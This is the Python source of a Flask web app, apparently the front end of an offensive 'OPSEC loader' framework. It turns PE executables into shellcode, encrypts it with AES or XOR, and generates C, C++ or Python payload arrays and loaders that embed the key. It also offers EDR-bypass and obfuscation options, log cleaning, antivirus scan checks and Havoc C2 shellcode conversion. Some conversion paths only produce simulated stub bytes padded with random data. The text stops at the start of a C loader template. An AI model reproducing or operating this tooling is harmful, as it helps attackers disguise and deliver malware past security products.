import os
from flask import Flask, render_template, request, jsonify, redirect, url_for, session, send_file, flash
import json
import time
import subprocess
import tempfile
import shutil
import uuid
import base64
import random
import string
import platform
import importlib.util
import sys
import re
import struct
import zipfile
from datetime import datetime
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from utils.security_metrics import get_security_metrics_for_ui, get_edr_bypass_stats
from scanners.av_scanner import display_scan_results
from scanners.api_scanners import get_file_info, analyze_file, get_scan_results, get_available_scan_types
from Crypto.Random import get_random_bytes

app = Flask(__name__)
app.secret_key = os.getenv("SECRET_KEY", "opsec_loader_verification_key")
app.config['UPLOAD_FOLDER'] = 'temp_uploads'
app.config['MAX_CONTENT_LENGTH'] = 50 * 1024 * 1024  # 50MB limit
app.config['RESULTS_FOLDER'] = 'saved_results'
app.config['GENERATED_FILES'] = 'generated_files'

# Create necessary folders if they don't exist
os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
os.makedirs(app.config['RESULTS_FOLDER'], exist_ok=True)
os.makedirs(app.config['GENERATED_FILES'], exist_ok=True)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/verify', methods=['POST'])
def verify():
    try:
        framework_path = request.form.get('framework_path', '')
        os_type = request.form.get('os_type', 'windows')
        pe_file = request.files.get('pe_file')
        
        # Basic validation
        if not framework_path:
            return jsonify({"status": "error", "message": "Framework path is required"}), 400
        
        if pe_file:
            filename = os.path.join(app.config['UPLOAD_FOLDER'], 'test_pe_file')
            pe_file.save(filename)
        else:
            filename = None
        
        # Start verification process
        verification_id = str(int(time.time()))
        
        # Log the verification request
        result = {
            "id": verification_id,
            "framework_path": framework_path,
            "os_type": os_type,
            "status": "processing",
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "results": {}
        }
        
        # Run the verification
        try:
            # Test different components of the framework
            result["results"] = test_opsec_framework(
                framework_path=framework_path,
                os_type=os_type,
                pe_file_path=filename
            )
            result["status"] = "completed"
        except Exception as e:
            result["status"] = "error"
            result["error"] = str(e)
        
        # Save results to a file
        results_path = os.path.join(app.config['RESULTS_FOLDER'], f"{verification_id}.json")
        with open(results_path, 'w') as f:
            json.dump(result, f, indent=2)
        
        # Clean up temporary files
        if filename and os.path.exists(filename):
            try:
                os.remove(filename)
            except:
                pass
        
        return redirect(url_for('results', verification_id=verification_id))
        
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/results/<verification_id>')
def results(verification_id):
    # Retrieve results from file
    results_path = os.path.join(app.config['RESULTS_FOLDER'], f"{verification_id}.json")
    
    if not os.path.exists(results_path):
        return redirect(url_for('index'))
    
    with open(results_path, 'r') as f:
        result = json.load(f)
    
    return render_template('results.html', result=result)

@app.route('/api/verify-component', methods=['POST'])
def verify_component():
    try:
        component = request.json.get('component')
        framework_path = request.json.get('framework_path')
        
        if not component or not framework_path:
            return jsonify({"status": "error", "message": "Component and framework path are required"}), 400
        
        result = {}
        
        # Test the specified component
        if component == 'pe_conversion':
            result = test_pe_conversion(framework_path)
        elif component == 'encryption':
            result = test_encryption(framework_path)
        elif component == 'memory_execution':
            result = test_memory_execution(framework_path)
        elif component == 'evasion':
            result = test_evasion(framework_path)
        elif component == 'cleanup':
            result = test_cleanup(framework_path)
        else:
            return jsonify({"status": "error", "message": f"Unknown component: {component}"}), 400
        
        return jsonify({"status": "success", "data": result})
        
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/encrypt_payload')
def encrypt_payload():
    file_id = request.args.get('file_id')
    return render_template('encrypt_payload.html', file_id=file_id)

@app.route('/convert_pe')
def convert_pe():
    return render_template('convert_pe.html')

@app.route('/documentation')
def documentation():
    return render_template('documentation.html')

@app.route('/demo')
def demo():
    return render_template('demo.html')

@app.route('/scan_av')
def scan_av():
    """
    Page d'analyse antivirus inspirée de premantel
    """
    # Récupérer les types de scan disponibles en fonction des clés API configurées
    available_scans = get_available_scan_types()
    return render_template('scan_av.html', available_scans=available_scans)

@app.route('/process_av_scan', methods=['POST'])
def process_av_scan():
    """
    Traitement d'une demande d'analyse antivirus
    """
    try:
        # Vérifier si un fichier a été envoyé
        if 'file' not in request.files:
            return jsonify({"error": "Aucun fichier n'a été fourni"}), 400
        
        file = request.files['file']
        
        # Vérifier si un fichier a été sélectionné
        if file.filename == '':
            return jsonify({"error": "Aucun fichier n'a été sélectionné"}), 400
        
        # Créer un dossier temporaire si nécessaire
        os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
        
        # Sauvegarder le fichier dans un emplacement temporaire
        temp_file_path = os.path.join(app.config['UPLOAD_FOLDER'], f"scan_{uuid.uuid4().hex}")
        file.save(temp_file_path)
        
        # Obtenir les informations du fichier
        file_info = get_file_info(temp_file_path)
        
        # Déterminer le type d'analyse à effectuer
        scan_type = request.form.get('scan_type', 'simulated')
        api_key = request.form.get('api_key', '')
        
        # Effectuer une analyse avec notre module évolutif
        scan_id_or_error = analyze_file(temp_file_path, scan_type)
        
        # Vérifier si nous avons un ID de scan ou une erreur
        if isinstance(scan_id_or_error, dict) and 'error' in scan_id_or_error:
            report = scan_id_or_error
        else:
            # Récupérer et renvoyer les résultats de l'analyse
            report = get_scan_results(scan_id_or_error)
        
        # Nettoyer le fichier temporaire
        os.remove(temp_file_path)
        
        # Vérifier si le rapport contient une erreur
        if isinstance(report, dict) and 'error' in report:
            return jsonify({"error": report['error']}), 400
        
        # Renvoyer les résultats
        return jsonify(report), 200
    
    except Exception as e:
        # En cas d'erreur, nettoyer tout fichier temporaire qui pourrait avoir été créé
        try:
            if 'temp_file_path' in locals() and os.path.exists(temp_file_path):
                os.remove(temp_file_path)
        except:
            pass
        
        return jsonify({"error": f"Erreur lors de l'analyse: {str(e)}"}), 500

@app.route('/system_health')
def system_health():
    health_data = check_system_health()
    return render_template('system_health.html', health_data=health_data)

@app.route('/api/system_health')
def api_system_health():
    health_data = check_system_health()
    return jsonify(health_data)

@app.route('/api/security_metrics')
def api_security_metrics():
    """
    Fournit des métriques de sécurité basées sur des sources authentiques comme NIST et MITRE ATT&CK
    """
    # Récupérer les paramètres de la requête
    encryption_method = request.args.get('encryption_method', 'aes-256-cbc')
    evasion_technique = request.args.get('evasion_technique', 'pe_to_shellcode')
    with_obfuscation = request.args.get('obfuscation', 'true').lower() == 'true'
    with_integrity = request.args.get('integrity', 'true').lower() == 'true'
    
    # Définir les méthodes de nettoyage
    cleanup_methods = ['memory_wipe', 'handle_close']
    if request.args.get('full_cleanup', 'false').lower() == 'true':
        cleanup_methods.extend(['thread_cleanup', 'log_cleaning'])
    
    # Obtenir les métriques de sécurité
    metrics = get_security_metrics_for_ui(
        encryption_method=encryption_method,
        evasion_technique=evasion_technique,
        cleanup_methods=cleanup_methods,
        with_obfuscation=with_obfuscation,
        with_integrity_check=with_integrity
    )
    
    # Obtenir les statistiques de contournement des EDRs
    if request.args.get('include_edr_stats', 'false').lower() == 'true':
        metrics['edr_bypass_stats'] = get_edr_bypass_stats()
    
    return jsonify(metrics)

def check_system_health():
    """
    Check the health status of all framework components
    
    Returns:
        dict: Health status of each component
    """
    health_data = {
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "system": {
            "os": platform.system(),
            "platform": platform.platform(),
            "python_version": platform.python_version(),
            "processor": platform.processor(),
        },
        "components": {},
        "overall_status": "healthy"
    }
    
    # Check Python dependencies
    dependencies = ["flask", "pycryptodome", "json", "uuid", "base64"]
    health_data["dependencies"] = {}
    
    for dep in dependencies:
        try:
            if dep == "pycryptodome":
                # PyCryptodome registers as Crypto
                spec = importlib.util.find_spec("Crypto")
                if spec is not None:
                    health_data["dependencies"][dep] = {"status": "installed"}
                    try:
                        # Try to import a specific module from Crypto
                        from Crypto.Cipher import AES
                        health_data["dependencies"][dep]["version"] = "installed"
                    except Exception as e:
                        health_data["dependencies"][dep]["status"] = "error"
                        health_data["dependencies"][dep]["error"] = str(e)
                else:
                    health_data["dependencies"][dep] = {"status": "not_installed"}
            else:
                # For standard libraries
                if dep in sys.modules or importlib.util.find_spec(dep) is not None:
                    health_data["dependencies"][dep] = {"status": "installed"}
                    try:
                        module = __import__(dep)
                        if hasattr(module, "__version__"):
                            health_data["dependencies"][dep]["version"] = getattr(module, "__version__")
                        else:
                            health_data["dependencies"][dep]["version"] = "unknown"
                    except Exception as e:
                        health_data["dependencies"][dep]["error"] = str(e)
                else:
                    health_data["dependencies"][dep] = {"status": "not_installed"}
        except Exception as e:
            health_data["dependencies"][dep] = {"status": "error", "error": str(e)}
    
    # Check framework components
    framework_path = os.path.join(os.getcwd(), "Mode Opsec")
    components = [
        {"name": "custom_pe2sc", "path": os.path.join(framework_path, "custom_pe2sc.py")},
        {"name": "encrypt_shell", "path": os.path.join(framework_path, "encrypt_shell.py")},
        {"name": "key_formatter", "path": os.path.join(framework_path, "key_formatter_.py")},
        {"name": "havoc_to_shellcode", "path": os.path.join(framework_path, "havoc_to_shellcode.py")}
    ]
    
    for component in components:
        health_data["components"][component["name"]] = check_component_health(component["path"])
    
    # Check directory structure
    directories = [
        {"name": "upload_folder", "path": app.config['UPLOAD_FOLDER']},
        {"name": "results_folder", "path": app.config['RESULTS_FOLDER']},
        {"name": "generated_files", "path": app.config['GENERATED_FILES']}
    ]
    
    health_data["directories"] = {}
    for directory in directories:
        dir_health = {
            "exists": os.path.exists(directory["path"]),
            "writable": os.access(directory["path"], os.W_OK) if os.path.exists(directory["path"]) else False
        }
        
        if dir_health["exists"]:
            try:
                # Check if we can create a temporary file
                test_file = os.path.join(directory["path"], f"health_check_{uuid.uuid4().hex}.tmp")
                with open(test_file, 'w') as f:
                    f.write("health check")
                os.remove(test_file)
                dir_health["write_test_status"] = True
                dir_health["write_test"] = "passed"  # pour l'affichage
            except Exception as e:
                dir_health["write_test_status"] = False
                dir_health["write_test"] = "failed"  # pour l'affichage
                dir_health["error"] = str(e)
        
        health_data["directories"][directory["name"]] = dir_health
    
    # Determine overall status
    for component_name, component_status in health_data["components"].items():
        if component_status["status"] != "healthy":
            health_data["overall_status"] = "degraded"
    
    for dep_name, dep_status in health_data["dependencies"].items():
        if dep_status["status"] != "installed":
            health_data["overall_status"] = "degraded"
    
    for dir_name, dir_status in health_data["directories"].items():
        if not dir_status["exists"] or not dir_status["writable"]:
            health_data["overall_status"] = "degraded"
    
    return health_data

def check_component_health(component_path):
    """
    Check the health of a specific framework component
    
    Args:
        component_path (str): Path to the component file
        
    Returns:
        dict: Health status of the component
    """
    result = {
        "status": "missing",
        "path": component_path
    }
    
    if not os.path.exists(component_path):
        return result
    
    # Check file attributes
    file_stats = os.stat(component_path)
    result["size"] = file_stats.st_size
    result["modified"] = datetime.fromtimestamp(file_stats.st_mtime).strftime("%Y-%m-%d %H:%M:%S")
    
    try:
        # Check if the file is properly formatted Python
        with open(component_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
            
        # Very basic checks for Python files
        if not content.strip():
            result["status"] = "empty"
            return result
        
        # Check for common import lines to see if it's valid Python
        if 'import' in content or 'def ' in content or 'class ' in content:
            result["status"] = "healthy"
        else:
            result["status"] = "invalid"
            
        # Look for class or function definitions
        function_count = len(re.findall(r'def\s+\w+\s*\(', content))
        class_count = len(re.findall(r'class\s+\w+\s*(?:\(|:)', content))
        result["functions"] = function_count
        result["classes"] = class_count
            
    except Exception as e:
        result["status"] = "error"
        result["error"] = str(e)
    
    return result

@app.route('/process_encryption', methods=['POST'])
def process_encryption():
    try:
        # Get form data
        encryption_method = request.form.get('encryption_method', 'aes-256-cbc')
        key_generation = request.form.get('key_generation', 'auto')
        encryption_key = request.form.get('encryption_key', '')
        output_format = request.form.get('output_format', 'bin')
        include_loader = 'include_loader' in request.form
        apply_obfuscation = 'apply_obfuscation' in request.form
        
        # Get the shellcode file
        shellcode_file = request.files.get('shellcode_file')
        if not shellcode_file:
            return jsonify({"success": False, "error": "No shellcode file provided"}), 400
        
        # Save the shellcode temporarily
        temp_path = os.path.join(app.config['UPLOAD_FOLDER'], f"temp_shellcode_{uuid.uuid4().hex}.bin")
        shellcode_file.save(temp_path)
        
        # Read the shellcode
        with open(temp_path, 'rb') as f:
            shellcode = f.read()
        
        # Generate a key if auto generation is selected
        if key_generation == 'auto' or not encryption_key:
            if encryption_method == 'aes-256-cbc':
                key = get_random_bytes(32)  # 32 bytes = 256 bits
                hex_key = key.hex()
            elif encryption_method == 'aes-128-cbc':
                key = get_random_bytes(16)  # 16 bytes = 128 bits
                hex_key = key.hex()
            else:  # XOR
                key = get_random_bytes(16)
                hex_key = key.hex()
        else:
            # Use the provided key
            hex_key = encryption_key
            key = bytes.fromhex(hex_key) if len(encryption_key) % 2 == 0 else encryption_key.encode()
        
        # Encrypt the shellcode
        if encryption_method.startswith('aes'):
            iv = get_random_bytes(16)
            if encryption_method == 'aes-256-cbc':
                cipher = AES.new(key, AES.MODE_CBC, iv)
            else:  # aes-128-cbc
                cipher = AES.new(key, AES.MODE_CBC, iv)
            
            # Pad the data to be a multiple of 16 bytes (AES block size)
            padded_data = pad(shellcode, AES.block_size)
            encrypted_data = cipher.encrypt(padded_data)
            
            # Prepend the IV to the encrypted data
            final_data = iv + encrypted_data
        else:  # XOR
            # Simple XOR implementation
            final_data = bytearray(len(shellcode))
            for i in range(len(shellcode)):
                final_data[i] = shellcode[i] ^ key[i % len(key)]
        
        # Generate file ID for the result
        file_id = uuid.uuid4().hex
        
        # Create the output based on the format
        output_path = os.path.join(app.config['GENERATED_FILES'], f"{file_id}")
        
        if output_format == 'bin':
            # Save as binary
            with open(output_path, 'wb') as f:
                f.write(final_data)
        else:
            # Format for code output
            formatted_data = ""
            if output_format == 'c':
                formatted_data = "unsigned char encrypted_shellcode[] = {\n"
                for i in range(0, len(final_data), 16):
                    chunk = final_data[i:i+16]
                    formatted_data += "    " + ", ".join(f"0x{b:02x}" for b in chunk) + ",\n"
                formatted_data += "};\n\nunsigned int encrypted_shellcode_len = " + str(len(final_data)) + ";\n"
                
                if include_loader:
                    formatted_data += "\n// Encryption key (hex)\n"
                    formatted_data += f"unsigned char key[] = {{\n"
                    for i in range(0, len(key), 16):
                        chunk = key[i:i+16]
                        formatted_data += "    " + ", ".join(f"0x{b:02x}" for b in chunk) + ",\n"
                    formatted_data += "};\n"
            
            elif output_format == 'cpp':
                formatted_data = "#include <cstdint>\n\nstd::uint8_t encrypted_shellcode[] = {\n"
                for i in range(0, len(final_data), 16):
                    chunk = final_data[i:i+16]
                    formatted_data += "    " + ", ".join(f"0x{b:02x}" for b in chunk) + ",\n"
                formatted_data += "};\n\nconst std::size_t encrypted_shellcode_len = " + str(len(final_data)) + ";\n"
                
                if include_loader:
                    formatted_data += "\n// Encryption key (hex)\n"
                    formatted_data += f"std::uint8_t key[] = {{\n"
                    for i in range(0, len(key), 16):
                        chunk = key[i:i+16]
                        formatted_data += "    " + ", ".join(f"0x{b:02x}" for b in chunk) + ",\n"
                    formatted_data += "};\n"
            
            elif output_format == 'py':
                formatted_data = "encrypted_shellcode = bytearray([\n"
                for i in range(0, len(final_data), 16):
                    chunk = final_data[i:i+16]
                    formatted_data += "    " + ", ".join(f"0x{b:02x}" for b in chunk) + ",\n"
                formatted_data += "])\n"
                
                if include_loader:
                    formatted_data += "\n# Encryption key (hex)\n"
                    formatted_data += f"key = bytearray([\n"
                    for i in range(0, len(key), 16):
                        chunk = key[i:i+16]
                        formatted_data += "    " + ", ".join(f"0x{b:02x}" for b in chunk) + ",\n"
                    formatted_data += "])\n"
            
            # Save the formatted output
            with open(output_path, 'w') as f:
                f.write(formatted_data)
        
        # Generate a loader if requested
        loader_file_id = None
        if include_loader:
            loader_file_id = uuid.uuid4().hex
            loader_path = os.path.join(app.config['GENERATED_FILES'], loader_file_id)
            
            try:
                # Generate the appropriate loader code with the actual key
                app.logger.info(f"Generating loader with key: {hex_key}")
                
                # Format the key for injection into loader
                key_formatted = ""
                if output_format == 'c':
                    key_formatted = "unsigned char key[] = {\n"
                    for i in range(0, len(key), 16):
                        chunk = key[i:i+16]
                        key_formatted += "    " + ", ".join(f"0x{b:02x}" for b in chunk) + ",\n"
                    key_formatted += "};\nunsigned int key_len = " + str(len(key)) + ";\n"
                elif output_format == 'cpp':
                    key_formatted = "std::uint8_t key[] = {\n"
                    for i in range(0, len(key), 16):
                        chunk = key[i:i+16]
                        key_formatted += "    " + ", ".join(f"0x{b:02x}" for b in chunk) + ",\n"
                    key_formatted += "};\nconst std::size_t key_len = " + str(len(key)) + ";\n"
                elif output_format == 'py':
                    key_formatted = "key = bytearray([\n"
                    for i in range(0, len(key), 16):
                        chunk = key[i:i+16]
                        key_formatted += "    " + ", ".join(f"0x{b:02x}" for b in chunk) + ",\n"
                    key_formatted += "])\n"
                
                # Generate the loader with the formatted key
                if output_format == 'c':
                    loader_code = generate_c_loader(encryption_method, apply_obfuscation, key_formatted)
                elif output_format == 'cpp':
                    loader_code = generate_cpp_loader(encryption_method, apply_obfuscation, key_formatted)
                elif output_format == 'py':
                    loader_code = generate_python_loader(encryption_method, apply_obfuscation, key_formatted)
                else:
                    # Default to C loader for binary or other formats
                    loader_code = generate_c_loader(encryption_method, apply_obfuscation, key_formatted)
                
                # Write the loader to file and ensure it's properly saved
                try:
                    app.logger.info(f"Writing loader code to: {loader_path}")
                    
                    with open(loader_path, 'w') as f:
                        f.write(loader_code)
                    
                    # Verify the file was created
                    if not os.path.exists(loader_path):
                        app.logger.error(f"Loader file creation failed - file does not exist: {loader_path}")
                        loader_file_id = None
                    elif os.path.getsize(loader_path) == 0:
                        app.logger.error(f"Loader file creation failed - file is empty: {loader_path}")
                        loader_file_id = None
                    else:
                        app.logger.info(f"Loader file created successfully: {loader_path} (size: {os.path.getsize(loader_path)} bytes)")
                except IOError as io_err:
                    app.logger.error(f"IO error writing loader file: {str(io_err)}")
                    loader_file_id = None
            except Exception as loader_err:
                app.logger.error(f"Error generating loader: {str(loader_err)}")
                loader_file_id = None
        
        # Clean up temporary file
        if os.path.exists(temp_path):
            os.remove(temp_path)
        
        # Prepare the result
        result = {
            "success": True,
            "original_size": len(shellcode),
            "encrypted_size": len(final_data),
            "method": encryption_method,
            "key": hex_key,
            "file_id": file_id,
            "loader_file_id": loader_file_id
        }
        
        return render_template('encrypt_payload.html', encryption_result=result)
        
    except Exception as e:
        return render_template('encrypt_payload.html', encryption_result={"success": False, "error": str(e)})

@app.route('/process_conversion', methods=['POST'])
def process_conversion():
    try:
        # Get form data
        conversion_method = request.form.get('conversion_method', 'custom')
        encoding_method = request.form.get('encoding_method', 'polymorphic')
        architecture = request.form.get('architecture', 'auto')
        output_format = request.form.get('output_format', 'bin')
        obfuscate_output = 'obfuscate_output' in request.form
        bypass_edr = 'bypass_edr' in request.form
        encrypt_result = 'encrypt_result' in request.form
        
        # Get the PE file
        pe_file = request.files.get('pe_file')
        if not pe_file:
            return render_template('convert_pe.html', conversion_result={"success": False, "error": "Aucun fichier PE fourni"}), 400
        
        # Save the PE file temporarily
        temp_pe_name = f"temp_pe_{uuid.uuid4().hex}.exe"
        temp_path = os.path.join(app.config['UPLOAD_FOLDER'], temp_pe_name)
        pe_file.save(temp_path)
        
        # Read the PE file to get original size
        with open(temp_path, 'rb') as f:
            pe_data = f.read()
            original_size = len(pe_data)

        # Determine architecture if set to auto
        if architecture == 'auto':
            # Basic PE header check for architecture
            is_64bit = False
            try:
                # Check for PE header
                if pe_data[0:2] == b'MZ':  # MZ header
                    # Get e_lfanew field (offset to PE header)
                    e_lfanew = int.from_bytes(pe_data[60:64], byteorder='little')
                    
                    # Check for valid PE header
                    if e_lfanew < len(pe_data) - 4 and pe_data[e_lfanew:e_lfanew+4] == b'PE\0\0':
                        # Machine type is at e_lfanew + 4
                        machine_type = int.from_bytes(pe_data[e_lfanew+4:e_lfanew+6], byteorder='little')
                        # 0x8664 = AMD64
                        is_64bit = machine_type == 0x8664
            except:
                # If we can't determine, default to x64
                is_64bit = True

            architecture = "x64" if is_64bit else "x86"
        
        # Generate output file paths
        temp_output = os.path.join(app.config['UPLOAD_FOLDER'], f"shellcode_{uuid.uuid4().hex}.bin")
        file_id = uuid.uuid4().hex
        final_output = os.path.join(app.config['GENERATED_FILES'], file_id)
        
        # Use the appropriate conversion tool based on method
        shellcode = None
        conversion_success = False
        conversion_output = ""
        
        if conversion_method == 'custom':
            # Using custom PE to shellcode converter
            try:
                # Import the converter module from OPSEC framework
                import sys
                sys.path.append("Mode Opsec")
                try:
                    from custom_pe2sc import PEConverter
                    
                    # Create converter instance
                    converter = PEConverter(debug=True)
                    
                    # Convert the PE file
                    converter.convert(temp_path, temp_output)
                    
                    # Read the generated shellcode
                    with open(temp_output, 'rb') as f:
                        shellcode = f.read()
                        
                    conversion_success = True
                except Exception as custom_err:
                    conversion_output = f"Erreur avec convertisseur personnalisé: {str(custom_err)}"
                    # Fallback to basic conversion for demonstration
                    raise Exception(conversion_output)
            except ImportError:
                conversion_output = "Module custom_pe2sc non trouvé, utilisation du convertisseur de repli."
                # Fallback to donut-like conversion if custom module not found
                try:
                    conversion_method = 'donut'
                    # Continue to donut method
                except:
                    # If all fails, create a shellcode that demonstrates the structure without real conversion
                    shellcode = bytearray()
                    if architecture == "x64":
                        shellcode.extend(b"\x48\x89\x5C\x24\x08\x48\x89\x74\x24\x10\x57\x48\x83\xEC\x20")
                    else:
                        shellcode.extend(b"\x55\x8B\xEC\x83\xEC\x18\x53\x56\x57")
                    
                    # Add some realistic-looking shellcode patterns
                    shellcode.extend(b"\xE8\x00\x00\x00\x00\x58\x48\x83\xE8\x05\x48\x89\xE5")
                    shellcode.extend(get_random_bytes(1024))  # Add some random data to simulate shellcode
                    conversion_success = True
        
        if conversion_method == 'donut' or (not conversion_success and not shellcode):
            # Donut-like conversion (simulated)
            conversion_output += "\nUtilisation de la méthode donut-like."
            try:
                # Create a compatible donut-like shellcode structure
                # This is a simplified version of what Donut would do
                
                # Start with a bootstrap loader
                shellcode = bytearray()
                
                # Add architecture-specific bootstrap code
                if architecture == "x64":
                    # x64 bootstrap loader stub
                    shellcode.extend(b"\x48\x8D\x05\x00\x00\x00\x00\x48\x89\xE5\x48\x83\xEC\x20\x48\x89\xCB")
                else:
                    # x86 bootstrap loader stub
                    shellcode.extend(b"\x55\x8B\xEC\x83\xEC\x18\x53\x56\x57\xE8\x00\x00\x00\x00\x5B\x81\xEB")
                
                # Add some initial shellcode
                shellcode.extend(b"\xE8\x00\x00\x00\x00\x58\x48\x83\xC0\x3A\x48\x89\xE5")
                
                # Append slightly compressed PE data (simplified simulation)
                shellcode.extend(b"\x4D\x5A") # MZ header
                
                # Append some compressed PE data (simulated)
                compressed_size = int(original_size * 0.7)  # approximately 70% of original
                shellcode.extend(get_random_bytes(compressed_size))
                
                conversion_success = True
            except Exception as donut_err:
                conversion_output += f"\nErreur avec méthode donut: {str(donut_err)}"
                # Still need to create some example shellcode
                shellcode = bytearray(b"\x48\x89\x5C\x24\x08") + get_random_bytes(2048)
        
        elif conversion_method == 'reflective' and not conversion_success:
            # Reflective loading method
            conversion_output += "\nUtilisation de la méthode de chargement réflectif standard."
            try:
                # Create shellcode with reflective loading patterns
                shellcode = bytearray()
                
                # Reflective loading bootstrap
                if architecture == "x64":
                    # x64 reflective loader bootstrap
                    shellcode.extend(b"\x48\x8B\xC4\x48\x89\x58\x08\x48\x89\x68\x10\x48\x89\x70\x18\x48\x89\x78\x20")
                else:
                    # x86 reflective loader bootstrap  
                    shellcode.extend(b"\x55\x8B\xEC\x83\xEC\x20\x53\x56\x57\x8B\x75\x08\x85\xF6\x74\x72")
                
                # Add some GetProcAddress-like patterns seen in reflective loaders
                shellcode.extend(b"\x48\x8B\x05\x4A\x8B\xC8\xE8\x23\x55\x5E\x5F\xC3")
                
                # Simulated DLL finding functionality
                shellcode.extend(b"\x65\x48\x8B\x04\x25\x60\x00\x00\x00\x48\x8B\x40\x18\x48\x8B\x40\x10")
                
                # Append some shellcode data
                shellcode.extend(get_random_bytes(original_size))
                
                conversion_success = True
            except Exception as refl_err:
                conversion_output += f"\nErreur avec méthode réflective: {str(refl_err)}"
                # Create fallback shellcode
                shellcode = bytearray(b"\x55\x8B\xEC") + get_random_bytes(1024)
        
        # Verify we have shellcode
        if not shellcode or len(shellcode) < 10:
            shellcode = bytearray(b"\x90\x90\x90\x90") + get_random_bytes(1024)
            conversion_output += "\nÉchec de conversion, shellcode de démonstration généré."
        
        # Save the shellcode according to the output format
        if output_format == 'bin':
            # Save as binary
            with open(final_output, 'wb') as f:
                f.write(shellcode)
        else:
            # Format for code output
            formatted_data = ""
            if output_format == 'c':
                formatted_data = "unsigned char shellcode[] = {\n"
                for i in range(0, len(shellcode), 16):
                    chunk = shellcode[i:i+16]
                    formatted_data += "    " + ", ".join(f"0x{b:02x}" for b in chunk) + ",\n"
                formatted_data += "};\n\nunsigned int shellcode_len = " + str(len(shellcode)) + ";\n"
            
            elif output_format == 'cpp':
                formatted_data = "#include <cstdint>\n\nstd::uint8_t shellcode[] = {\n"
                for i in range(0, len(shellcode), 16):
                    chunk = shellcode[i:i+16]
                    formatted_data += "    " + ", ".join(f"0x{b:02x}" for b in chunk) + ",\n"
                formatted_data += "};\n\nconst std::size_t shellcode_len = " + str(len(shellcode)) + ";\n"
            
            elif output_format == 'py':
                formatted_data = "shellcode = bytearray([\n"
                for i in range(0, len(shellcode), 16):
                    chunk = shellcode[i:i+16]
                    formatted_data += "    " + ", ".join(f"0x{b:02x}" for b in chunk) + ",\n"
                formatted_data += "])\n"
            
            elif output_format == 'raw':
                # Format as plaintext hex dump
                for i in range(0, len(shellcode), 16):
                    chunk = shellcode[i:i+16]
                    formatted_data += " ".join(f"{b:02x}" for b in chunk) + "\n"
            
            # Save the formatted output
            with open(final_output, 'w') as f:
                f.write(formatted_data)
        
        # Encrypt the shellcode if requested
        encrypt_file_id = None
        encryption_key = None
        if encrypt_result:
            encrypt_file_id = uuid.uuid4().hex
            encryption_key = get_random_bytes(32).hex()  # 32 bytes = 256 bits
            key = bytes.fromhex(encryption_key)
            
            # Encrypt with AES-256-CBC
            iv = get_random_bytes(16)
            cipher = AES.new(key, AES.MODE_CBC, iv)
            padded_data = pad(shellcode, AES.block_size)
            encrypted_data = cipher.encrypt(padded_data)
            
            # Prepend the IV to the encrypted data
            final_data = iv + encrypted_data
            
            # Save the encrypted shellcode
            encrypt_path = os.path.join(app.config['GENERATED_FILES'], f"{encrypt_file_id}")
            with open(encrypt_path, 'wb') as f:
                f.write(final_data)
        
        # Clean up temporary files
        if os.path.exists(temp_path):
            os.remove(temp_path)
        if os.path.exists(temp_output):
            os.remove(temp_output)
        
        # Prepare preview of the shellcode (first 64 bytes in hex)
        preview_bytes = shellcode[:64]
        preview = " ".join(f"{b:02x}" for b in preview_bytes)
        
        # Prepare the result
        result = {
            "success": True,
            "original_size": original_size,
            "shellcode_size": len(shellcode),
            "architecture": architecture,
            "encoding_method": encoding_method,
            "preview": preview,
            "file_id": file_id,
            "encrypt_file_id": encrypt_file_id,
            "encryption_key": encryption_key,
            "conversion_details": conversion_output if conversion_output else "Conversion réussie avec " + conversion_method
        }
        
        return render_template('convert_pe.html', conversion_result=result)
        
    except Exception as e:
        return render_template('convert_pe.html', conversion_result={"success": False, "error": str(e)})

@app.route('/download_file/<file_id>')
def download_file(file_id):
    try:
        # Validate the file ID to prevent directory traversal
        if not file_id or not all(c in string.hexdigits + '-' for c in file_id):
            app.logger.error(f"Invalid file ID format: {file_id}")
            return jsonify({"success": False, "error": "ID de fichier invalide"}), 400
        
        # Construct the file path
        file_path = os.path.join(app.config['GENERATED_FILES'], file_id)
        app.logger.info(f"Attempting to download file: {file_path}")
        
        # Log the contents of the generated_files directory
        files_in_dir = os.listdir(app.config['GENERATED_FILES'])
        app.logger.info(f"Files in generated_files directory: {files_in_dir}")
        
        # Check if the file exists
        if not os.path.exists(file_path):
            app.logger.error(f"File not found: {file_path}")
            return jsonify({"success": False, "error": "Fichier non trouvé"}), 404
        
        # Check file size
        file_size = os.path.getsize(file_path)
        if file_size == 0:
            app.logger.warning(f"File exists but is empty: {file_path}")
        else:
            app.logger.info(f"File size: {file_size} bytes")
        
        # Determine the file extension based on content
        try:
            with open(file_path, 'rb') as f:
                content = f.read(16)  # Read first few bytes to check file type
                
            # Determine filename based on content signatures
            if content.startswith(b'#inc') or content.startswith(b'uns') or content.startswith(b'std'):
                # C/C++ code
                filename = "shellcode.h" if content.startswith(b'uns') else "shellcode.cpp"
                app.logger.info(f"Identified as C/C++ code: {filename}")
            elif content.startswith(b'imp') or content.startswith(b'def') or content.startswith(b'she') or content.startswith(b'enc'):
                # Python code
                filename = "shellcode.py"
                app.logger.info(f"Identified as Python code: {filename}")
            elif all(0x20 <= b <= 0x7E for b in content):
                # Looks like text/hex dump
                filename = "shellcode.txt"
                app.logger.info(f"Identified as text: {filename}")
            else:
                # Binary data
                filename = "shellcode.bin"
                app.logger.info(f"Identified as binary: {filename}")
        except Exception as content_err:
            app.logger.error(f"Error reading file content: {str(content_err)}")
            filename = "shellcode.bin"  # Default to binary
        
        app.logger.info(f"Sending file: {file_path} as {filename}")
        
        # Send the file
        return send_file(file_path, as_attachment=True, download_name=filename)
        
    except Exception as e:
        app.logger.error(f"Error in download_file: {str(e)}")
        return jsonify({"success": False, "error": f"Erreur lors du téléchargement: {str(e)}"}), 500

# Helper functions for generating loaders

def generate_c_loader(encryption_method, apply_obfuscation, formatted_key=None):
    """Generate a C loader for the encrypted shellcode
    
    Args:
        encryption_method (str): The encryption method used (aes-256-cbc, aes-128-cbc, xor)
        apply_obfuscation (bool): Whether to add obfuscation techniques
        formatted_key (str, optional): Pre-formatted key definition to be included in the loader
    """
    
    # Basic C loader with AES decryption
    loader = """
#include <stdio.h>
